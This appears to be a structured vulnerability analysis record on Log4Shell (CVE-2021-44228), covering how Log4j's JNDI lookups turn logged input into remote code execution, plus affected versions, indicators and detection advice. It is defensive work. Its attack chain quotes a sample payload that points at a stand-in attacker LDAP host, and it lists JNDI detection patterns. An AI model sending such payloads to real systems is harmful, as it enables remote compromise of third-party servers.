package_info.why_malicious: The affected versions of the Log4j library contain a critical remote code execution vulnerability (Log4Shell, CVE-2021-44228) that allows attackers to execute arbitrary code on systems that log attacker-controlled input. This is not a case of intentionally malicious code, but a severe vulnerability that enables malicious exploitation by interpreting user-controlled log messages as JNDI lookups, resulting in untrusted code execution.

execution_context.trigger: At runtime, when a log message containing a JNDI lookup pattern is processed by the logging framework
execution_context.file_location: org/apache/logging/log4j/core/lookup/JndiLookup.java (Log4j core library, used internally by log4j)
required_permissions: Network access (to perform outbound LDAP/RMI/JNDI requests)
Ability to load and execute remote Java classes (if exploited)
Permission to process attacker-controlled log input

malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the Log4j library interprets the pattern, performs a JNDI lookup to the specified LDAP server, retrieves a remote Java class from the attacker-controlled server, and executes it, resulting in arbitrary code execution on the victim system.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger outbound network requests and load/execute remote code via JNDI, which is a classic remote code execution vector and a severe security risk.
malice_analysis.violated_expectations: Normal logging libraries should treat log message content as inert data and must not interpret or execute code, nor initiate network requests based on log data. Here, user-controlled log messages can directly trigger code execution, violating the principle of data/code separation.
malice_analysis.similar_legitimate_use: JNDI lookups may be used for dynamic configuration or resource resolution in trusted, internal environments, but should never be exposed to untrusted or user-controlled input in production systems.
key_indicators: Presence of ${jndi:...} patterns in log messages
Automatic outbound LDAP, RMI, or other JNDI-related network requests initiated by log processing
Loading and execution of remote Java classes via JNDI lookups
Use of the JndiLookup class in log4j-core

attack_chain.action: Attacker sends a crafted string containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to an application endpoint that is logged by the vulnerable Log4j instance.
attack_chain.leads_to: Log4j processes the log message and interprets the JNDI lookup pattern.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server specified in the log message.
attack_chain.leads_to: The application establishes an outbound connection to the attacker's server and retrieves a remote Java class.

attack_chain.action: The remote Java class is loaded and executed on the victim system, granting the attacker remote code execution.
attack_chain.leads_to: Full system compromise or further post-exploitation actions by the attacker.

behavioral_signatures: Log messages containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar JNDI patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests originating from application servers
Loading of remote Java classes via JNDI lookups during log processing
Invocation of the JndiLookup class in log4j-core during runtime
file_indicators: Presence of vulnerable log4j-core JAR files (versions 2.0-beta9 through 2.14.1) in application dependencies
Application logs containing suspicious JNDI patterns such as ${jndi:ldap://}
network_indicators: Outbound LDAP or RMI requests to untrusted or external servers from application hosts
Connections to attacker-controlled infrastructure (e.g., domains or IPs specified in JNDI patterns) following log events
Unusual network activity on ports commonly used by LDAP (389, 636) or RMI (1099)
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (e.g., ${jndi:ldap://}, ${jndi:rmi://}), scan for vulnerable log4j-core versions (2.0-beta9 through 2.14.1) in all dependencies, and monitor for unexpected outbound LDAP/RMI network traffic from application servers. Use security tools to flag or block log messages that could trigger JNDI lookups, disable the JndiLookup class if possible, and ensure all log4j dependencies are updated to patched versions. Correlate log events with network activity to identify exploitation attempts.
